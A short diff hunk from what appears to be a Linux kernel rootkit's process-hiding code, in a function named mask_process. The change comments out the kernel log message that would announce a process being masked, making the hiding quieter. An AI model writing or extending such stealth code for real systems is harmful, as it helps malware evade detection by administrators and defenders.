@@ -167,7 +167,7 @@ int mask_process(pid_t pid)
 
 	list_add(&new->list, &masked_processes);
 
-	printk(KERN_INFO "rootkit process_masking: masking process with PID %d\n", pid);
+	//printk(KERN_INFO "rootkit process_masking: masking process with PID %d\n", pid);
 
 	return 0;
 }
